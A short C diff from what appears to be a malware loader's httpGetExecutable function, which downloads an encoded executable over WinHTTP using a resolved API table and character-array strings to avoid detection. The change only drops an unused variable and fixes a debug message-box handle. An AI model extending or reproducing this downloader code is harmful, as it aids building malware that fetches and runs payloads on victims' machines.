@@ -445,7 +445,6 @@ LPVOID httpGetExecutable(PAPI api, PDWORD pdwDllSize, WCHAR* wEndpoint, WCHAR* w
     }
 
     LPVOID lpEncodedBuffer = (LPVOID)((CALLOC)api->calloc)((size_t)(dwEncodedExecutableSize), (size_t)sizeof(WCHAR));
-    WCHAR* wcEncodedBuffer = (WCHAR*)lpEncodedBuffer;
     DWORD dwBytesRead = 0;
     DWORD dwAvailableBytes = 0;
     DWORD dwActuallyRead = 0;
@@ -464,7 +463,7 @@ LPVOID httpGetExecutable(PAPI api, PDWORD pdwDllSize, WCHAR* wEndpoint, WCHAR* w
         {
             #ifdef DEBUG
             CHAR whrdFailed[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 'F' };
-            ((MESSAGEBOXA)api->MessageBoxA)(-1, whrdFailed, whrdFailed, 0x0L);
+            ((MESSAGEBOXA)api->MessageBoxA)(0, whrdFailed, whrdFailed, 0x0L);
             #endif
         }
 
